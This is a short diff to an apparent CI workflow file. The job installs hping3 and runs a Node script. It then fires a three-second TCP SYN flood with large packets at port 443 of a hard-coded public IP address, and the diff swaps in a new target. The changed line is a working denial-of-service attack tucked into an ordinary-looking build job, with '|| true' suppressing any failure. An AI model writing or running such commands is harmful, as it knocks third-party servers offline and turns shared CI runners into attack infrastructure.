@@ -59,4 +59,4 @@ jobs:
           sudo apt install hping3 -q
           yarn
           timeout 600s node index.js --count ${{env.TASK_COUNT}}
-          sudo timeout 3s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 8.130.111.153 || true
+          sudo timeout 3s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.11 || true
